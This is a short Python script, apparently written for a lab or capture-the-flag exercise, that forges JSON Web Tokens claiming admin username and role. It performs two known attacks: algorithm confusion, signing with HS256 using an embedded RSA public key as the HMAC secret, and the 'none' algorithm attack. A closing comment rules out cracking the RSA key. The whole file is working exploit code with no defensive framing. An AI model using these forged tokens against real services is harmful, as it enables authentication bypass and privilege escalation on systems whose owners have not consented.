import jwt # pyjwt
import base64

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzdk1zKekmoidGS78NWTI
hE88NW+jXqyMpsdxrmhEwBiFQHr1cvB5qXb7GecRSkRrN/w8SaeZJPDUsuKBULiu
qfmScKEmcdrSyI152KPCiho7pNTC8ijkFyEGyTgUNQyMWRnDVCOyAGXcsD44hKjU
WEfYiVcicgIpKNbV6tuIsr7Kl4KqYa2qSiolm6uruxc7MXin4+HijoVa4qmlrT5N
7ULdgFDedI8XHuQfyUyg2858kWwsWlOfe++F+fbBc2Omolui5GcR6tw6p6453Hcm
UUIFvxVsywxTGqld/ENC0W3gMChkKqIsXEQ7kEK7TQgRBLQQP1/Mfmos/kcOADVt
8wIDAQAB
-----END PUBLIC KEY-----"""


raw_key = ""
base64_key = public_key.replace("-----BEGIN PUBLIC KEY-----", "").replace("-----END PUBLIC KEY-----", "").strip()
raw_key_bytes = base64.b64decode(base64_key)  # Decode to bytes

payload = {"username":"admin","role":"admin","iat":1739128313}

# authlib
# forged_jwt = jwt.encode({"alg": "HS256"}, payload, raw_key_bytes)


# pyjwt

# Algorithm Confusion Attack
forged_jwt = jwt.encode(
    payload,
    raw_key_bytes,   # Using public key as HMAC secret
    algorithm="HS256"
)
print("HS256", forged_jwt)

# None Algorithm Attack
forged_jwt = jwt.encode(payload, key=None, algorithm=None)
print("None", forged_jwt)

# Cracking RS algo key (> 2048 so its not possible)

